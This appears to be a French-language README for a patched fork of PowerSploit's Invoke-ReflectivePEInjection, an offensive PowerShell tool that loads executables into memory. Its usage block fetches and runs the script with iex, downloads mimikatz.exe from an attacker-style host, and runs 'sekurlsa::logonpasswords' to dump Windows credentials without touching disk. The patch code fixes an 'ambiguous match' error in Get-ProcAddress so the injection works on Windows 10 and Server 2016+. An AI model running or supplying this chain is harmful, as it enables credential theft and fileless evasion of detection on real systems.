
# Invoke-ReflectivePEInjection - Patch pour Windows 10 et Windows Server 2016+

## Usage

```powershell
# Activer TLS 1.2 pour le téléchargement
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Télécharger la version corrigée d'Invoke-ReflectivePEInjection
$b = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/SafeItConsulting/Invoke-ReflectivePEInjection/refs/heads/main/Invoke-ReflectivePEInjection.ps1"
iex($b)

# Télécharger un fichier PE (exemple : mimikatz.exe) en mémoire
$x = (New-Object System.Net.WebClient).DownloadData('https://attackercdn.fr/mimikatz.exe')

# Exécuter l'outil injecté en mémoire
Invoke-ReflectivePEInjection -PEBytes ($x) -ExeArgs "sekurlsa::logonpasswords exit"
```

---

## Contexte

L'ancienne version de `Invoke-ReflectivePEInjection` provenant de **PowerSploit** ne fonctionne plus correctement sur les systèmes **Windows Server 2016+** et **Windows 10 récents**.  
L'erreur se produit principalement dans la fonction `Get-ProcAddress` lors de l'appel aux méthodes `GetMethod` et `GetDelegateForFunctionPointer`.

### Exemple d'erreur :
```plaintext
Exception lors de l'appel de « GetMethod » avec « 1 » argument(s) : « Correspondance ambiguë trouvée. »
Au caractère Ligne:1002 : 9
+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : AmbiguousMatchException
```

---

## Correctif (Patch)

### Fonction `Get-ProcAddress` corrigée
```powershell
Function Get-ProcAddress {
    Param (
        [OutputType([IntPtr])]
        [Parameter(Position = 0, Mandatory = $True)]
        [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)]
        [String] $Procedure
    )
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll')
    }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    # Récupère une référence aux méthodes GetModuleHandle et GetProcAddress
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $x = $($UnsafeNativeMethods.GetMethods() | Where-Object { $_.Name -eq "getprocaddress" })
    
    # Gestion des doublons : sélectionner la méthode appropriée
    if (Get-Member -InputObject $x -Name Length -MemberType Properties) {
        $GetProcAddress = $x[1]
    } else {
        $GetProcAddress = $UnsafeNativeMethods.GetMethod("GetProcAddress")
    }
    
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
```

---

## Explication

- **`Get-ProcAddress`** : Cette fonction patchée corrige la gestion des méthodes en cas de doublons, qui provoque l'erreur **"Correspondance ambiguë"**.
- **`Invoke-ReflectivePEInjection`** : Cette commande permet l'injection d'une charge PE directement en mémoire.
- **Mode file-less** : Le fichier `mimikatz.exe` est téléchargé et injecté sans toucher le FS

---

## Sources
- Ancienne version PowerSploit :  
  [PowerSploit CodeExecution](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)  

- Version corrigée :  
  [SafeITConsulting/Invoke-ReflectivePEInjection](https://raw.githubusercontent.com/SafeItConsulting/Invoke-ReflectivePEInjection/refs/heads/main/Invoke-ReflectivePEInjection.ps1)  
